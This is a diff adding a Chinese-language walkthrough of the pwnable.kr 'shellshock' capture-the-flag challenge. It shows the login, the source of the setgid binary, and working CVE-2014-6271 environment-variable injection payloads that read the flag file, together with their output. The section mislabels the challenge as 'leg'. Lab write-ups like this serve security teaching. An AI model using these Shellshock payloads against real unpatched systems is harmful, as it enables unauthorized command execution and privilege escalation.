@@ -9294,3 +9294,92 @@ Mommy, the operator priority always confuses me :(
 
 ------
 
+### shellshock
+
+这是**Pwnable.kr**的第十个挑战`leg`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Mommy, there was a shocking news about bash.
+I bet you already know, but lets just make it sure :)
+
+
+ssh shellshock@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh shellshock@pwnable.kr -p2222
+shellshock@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Thu Jun  8 11:45:56 2023 from 84.110.212.230
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+shellshock@pwnable:~$ ls -la
+total 980
+drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
+drwxr-xr-x 117 root root             4096 Nov 10  2022 ..
+-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
+d---------   2 root root             4096 Oct 12  2014 .bash_history
+-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
+dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
+drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
+-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
+```
+
+我们可以看到四个文件`shellshock`、`shellshock.c`和`flag`还有`bash`，其中`shellshock`是`ELF`二进制可执行文件，`shellshock.c`是编译二进制文件的`C`代码，用户`shellshock`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat shellshock.c`来查看`shellshock.c`的代码。
+
+```bash
+shellshock@pwnable:~$ cat shellshock.c
+#include <stdio.h>
+int main(){
+    setresuid(getegid(), getegid(), getegid());
+    setresgid(getegid(), getegid(), getegid());
+    system("/home/shellshock/bash -c 'echo shock_me'");
+    return 0;
+}
+```
+
+该挑战来自CVE-2014-6271漏洞，这是一个被称为Shellshock的漏洞问题。系统中提供的二进制文件`bash`就具有CVE-2014-6271漏洞。我们可以输入以下内容进行测试：
+
+```bash
+env x='() { :;}; echo Fuck' ./bash -c "echo You!"
+```
+
+通过查看终端输出，我们可以确定系统提供的二进制文件`bash`能受到shellshock攻击，如果已经打了补丁的话，`bash`会静默退出。利用该漏洞，我们可以将`./shellshock`中的系统调用`system("/home/shellshock/bash -c 'echo shock_me'");`进行拼接。
+
+```bash
+env x='() { :;}; /bin/cat flag' ./shellshock
+```
+
+这样就能拿到`flag`：`only if I knew CVE-2014-6271 ten years ago..!!`。
+
+```bash
+shellshock@pwnable:~$ env x='() { :;}; echo Fuck' ./bash -c "echo You!"
+Fuck
+You!
+shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault (core dumped)
+```
+
+------
+
